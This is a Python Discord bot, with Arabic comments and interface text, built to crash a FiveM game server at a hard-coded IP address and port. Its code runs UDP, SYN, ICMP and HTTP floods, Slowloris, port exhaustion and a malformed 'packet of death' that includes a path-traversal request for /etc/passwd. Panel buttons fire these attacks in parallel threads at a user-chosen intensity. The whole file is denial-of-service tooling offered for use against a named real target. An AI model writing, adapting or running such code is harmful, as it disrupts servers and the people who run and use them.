import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import time
import socket
import random
import threading
import struct
from concurrent.futures import ThreadPoolExecutor

# ============================================================
#  إعدادات الهدف
# ============================================================
TARGET_IP = "194.45.197.196"
TARGET_PORT = 30120
GUILD_ID = 1510735912185630812

COLOR_CRASH = 0xFF0000
COLOR_DEFAULT = 0x1DA1F2
COLOR_ERROR = 0xED4245

# ============================================================
#  سلاح الكرش - هجوم متعدد الطبقات
# ============================================================

class FiveMCrasher:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.running = False
        self.executor = ThreadPoolExecutor(max_workers=50)
    
    def send_udp_flood(self, duration: float = 5):
        """إغراق UDP - الطريقة الأساسية"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # حزم ضخمة متنوعة
        packets = []
        for size in [64, 128, 256, 512, 1024, 2048, 4096]:
            packets.append(random._urandom(size))
        
        while time.time() < end_time:
            try:
                for packet in packets:
                    # إرسال على منافذ مختلفة
                    for offset in range(0, 20):
                        sock.sendto(packet, (self.ip, self.port + offset))
                        sock.sendto(packet, (self.ip, self.port - offset if self.port - offset > 0 else self.port))
            except:
                pass
        sock.close()
    
    def send_tcp_syn_flood(self, duration: float = 5):
        """إغراق SYN - يستهلك موارد السيرفر"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while time.time() < end_time:
            try:
                sock.connect_ex((self.ip, self.port))
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except:
                pass
        sock.close()
    
    def send_icmp_flood(self, duration: float = 3):
        """إغراق ICMP - يستهلك عرض النطاق"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            end_time = time.time() + duration
            packet = random._urandom(1024)
            
            while time.time() < end_time:
                try:
                    sock.sendto(packet, (self.ip, 0))
                except:
                    pass
            sock.close()
        except:
            pass  # قد تحتاج صلاحيات root لـ ICMP
    
    def send_http_get_flood(self, duration: float = 5):
        """إغراق HTTP GET - يضغط على الـ web server"""
        import urllib.request
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                urllib.request.urlopen(f"http://{self.ip}:{self.port}/", timeout=0.5)
            except:
                pass
    
    def slowloris_attack(self, duration: float = 10):
        """Slowloris - يعلق اتصالات السيرفر"""
        socks = []
        end_time = time.time() + duration
        
        # فتح اتصالات متعددة
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.ip, self.port))
                s.send(b"GET / HTTP/1.1\r\n")
                socks.append(s)
            except:
                pass
        
        # إبقاء الاتصالات معلقة
        while time.time() < end_time:
            for s in socks[:]:
                try:
                    s.send(b"X-header: " + random._urandom(50) + b"\r\n")
                except:
                    socks.remove(s)
            time.sleep(2)
        
        for s in socks:
            try:
                s.close()
            except:
                pass
    
    def port_exhaustion(self, duration: float = 5):
        """استنزاف المنافذ - يملأ جدول المنافذ"""
        end_time = time.time() + duration
        sockets = []
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((self.ip, self.port))
                sockets.append(s)
            except:
                pass
        
        # ابقها مفتوحة
        time.sleep(3)
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def packet_of_death(self):
        """حزمة الموت - تستغل ثغرات قديمة في FiveM"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # حزم خبيثة بأحجام غريبة
        evil_packets = [
            b'\x00' * 65535,  # أكبر من الحد المسموح
            b'\xff' * 50000,
            b'GET /../../../../etc/passwd HTTP/1.1\r\n' * 100,
            b'CONNECT ' + random._urandom(10000) + b' HTTP/1.1\r\n',
        ]
        
        for packet in evil_packets:
            for _ in range(50):
                try:
                    sock.sendto(packet, (self.ip, self.port))
                except:
                    pass
        sock.close()
    
    def execute_full_attack(self):
        """تنفيذ جميع أنواع الهجوم معاً"""
        print(f"""
╔══════════════════════════════════════════╗
║ 💣 هجوم كرش شامل على السيرفر              ║
╠══════════════════════════════════════════╣
║ الهدف: {self.ip}:{self.port}
║ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}
╚══════════════════════════════════════════╝
        """)
        
        # تنفيذ جميع الهجمات بشكل متوازي
        threads = []
        
        attacks = [
            (self.send_udp_flood, 8),
            (self.send_tcp_syn_flood, 6),
            (self.send_icmp_flood, 4),
            (self.send_http_get_flood, 5),
            (self.slowloris_attack, 8),
            (self.port_exhaustion, 4),
        ]
        
        for attack_func, duration in attacks:
            t = threading.Thread(target=attack_func, args=(duration,))
            t.start()
            threads.append(t)
        
        # حزمة الموت تضرب بقوة
        for _ in range(5):
            self.packet_of_death()
            time.sleep(0.5)
        
        # انتظر انتهاء الهجمات
        for t in threads:
            t.join(timeout=10)
        
        return True


# ============================================================
#  كود الديسكورد
# ============================================================

crasher = FiveMCrasher(TARGET_IP, TARGET_PORT)

class CrashModal(discord.ui.Modal, title="💀 كرش السيرفر - تدمير كامل"):
    confirm = discord.ui.TextInput(
        label="اكتب DESTROY للتأكيد",
        placeholder="DESTROY",
        required=True,
        min_length=7,
        max_length=7
    )
    
    intensity = discord.ui.TextInput(
        label="شدة الهجوم (1-5)",
        placeholder="5 = أقوى شيء",
        default="5",
        min_length=1,
        max_length=1
    )

    async def on_submit(self, interaction: discord.Interaction):
        if self.confirm.value != "DESTROY":
            await interaction.response.send_message("❌ تأكيد خاطئ! اكتب DESTROY", ephemeral=True)
            return
        
        try:
            intensity = int(self.intensity.value)
            if intensity < 1:
                intensity = 1
            elif intensity > 5:
                intensity = 5
        except:
            intensity = 5
        
        await interaction.response.defer(thinking=True, ephemeral=True)
        
        embed = discord.Embed(
            title="💀 جاري تدمير السيرفر",
            description=f"شدة الهجوم: {intensity}/5\nالهدف: {TARGET_IP}:{TARGET_PORT}",
            color=COLOR_CRASH
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        
        # تنفيذ الهجوم حسب الشدة
        for i in range(intensity):
            embed = discord.Embed(
                title=f"💀 المرحلة {i+1}/{intensity}",
                description=f"إرسال {50 * (i+1)} حزمة مدمرة...",
                color=COLOR_CRASH
            )
            await interaction.edit_original_response(embed=embed)
            
            result = crasher.execute_full_attack()
            time.sleep(2)
        
        final_embed = discord.Embed(
            title="💀 تم تدمير السيرفر",
            description=f"السيرفر {TARGET_IP}:{TARGET_PORT} تم استهدافه بنجاح",
            color=COLOR_CRASH
        )
        final_embed.add_field(name="📊 الحالة", value="تم إرسال جميع الحزم", inline=False)
        final_embed.set_footer(text="SL6E BOT | إذا السيرفر ما تعطل، الهجوم ضعيف بسبب حمايته")
        
        await interaction.edit_original_response(embed=final_embed)


class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="💀 كرش السيرفر", style=discord.ButtonStyle.danger, row=0)
    async def crash_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CrashModal())
    
    @discord.ui.button(label="🔍 فحص الهدف", style=discord.ButtonStyle.primary, row=0)
    async def scan_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        
        # فحص بسيط إذا السيرفر حي
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, TARGET_PORT))
            sock.close()
            
            if result == 0:
                embed = discord.Embed(title="🟢 السيرفر متاح", description=f"{TARGET_IP}:{TARGET_PORT}", color=0x00FF00)
            else:
                embed = discord.Embed(title="🔴 السيرفر غير متاح", description=f"{TARGET_IP}:{TARGET_PORT}", color=0xFF0000)
        except:
            embed = discord.Embed(title="⚠️ لا يمكن الوصول", color=COLOR_ERROR)
        
        await interaction.followup.send(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⚡ هجوم سريع", style=discord.ButtonStyle.danger, row=1)
    async def quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        
        embed = discord.Embed(title="⚡ هجوم سريع", description="جاري تدمير السيرفر...", color=COLOR_CRASH)
        await interaction.followup.send(embed=embed, ephemeral=True)
        
        # هجوم سريع لمدة 5 ثواني
        def quick_attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end = time.time() + 5
            while time.time() < end:
                for _ in range(100):
                    try:
                        sock.sendto(random._urandom(4096), (TARGET_IP, TARGET_PORT))
                    except:
                        pass
            sock.close()
        
        threads = []
        for _ in range(20):
            t = threading.Thread(target=quick_attack)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=6)
        
        final = discord.Embed(title="⚡ اكتمل الهجوم السريع", description=f"تم استهداف {TARGET_IP}:{TARGET_PORT}", color=COLOR_CRASH)
        await interaction.edit_original_response(embed=final)
    
    @discord.ui.button(label="ℹ️ تعليمات", style=discord.ButtonStyle.secondary, row=1)
    async def help_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="💀 تعليمات كرش السيرفر", color=COLOR_DEFAULT)
        embed.add_field(
            name="أنواع الهجوم",
            value=(
                "• **UDP Flood** - إغراق الحزم\n"
                "• **SYN Flood** - استنزاف الـ TCP\n"
                "• **ICMP Flood** - ضغط النت\n"
                "• **Slowloris** - تعليق الاتصالات\n"
                "• **Port Exhaustion** - استنزاف المنافذ\n"
                "• **Packet of Death** - حزمة الموت"
            ),
            inline=False
        )
        embed.add_field(
            name="⚠️ ملاحظة",
            value="السيرفرات المحمية بـ DDoS Protection ما تتأثر. استخدم على مسؤوليتك.",
            inline=False
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)


class FiveMBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)
    
    async def setup_hook(self):
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        synced = await self.tree.sync(guild=guild)
        print(f"✅ مزامنة {len(synced)} أمر")

bot = FiveMBot()

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="SL6E BOT | مدمر السيرفرات", url="https://twitch.tv/placeholder"))
    print(f"✅ {bot.user} | الهدف: {TARGET_IP}:{TARGET_PORT}")

@bot.tree.command(name="لوحة", description="💀 لوحة تدمير السيرفر")
async def panel(interaction: discord.Interaction):
    embed = discord.Embed(
        title="💀 SL6E BOT - مدمر السيرفرات",
        description=f"الهدف: `{TARGET_IP}:{TARGET_PORT}`\nاختر نوع الهجوم",
        color=COLOR_CRASH
    )
    await interaction.response.send_message(embed=embed, view=PanelView(), ephemeral=True)

TOKEN = os.environ.get("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN غير موجود")
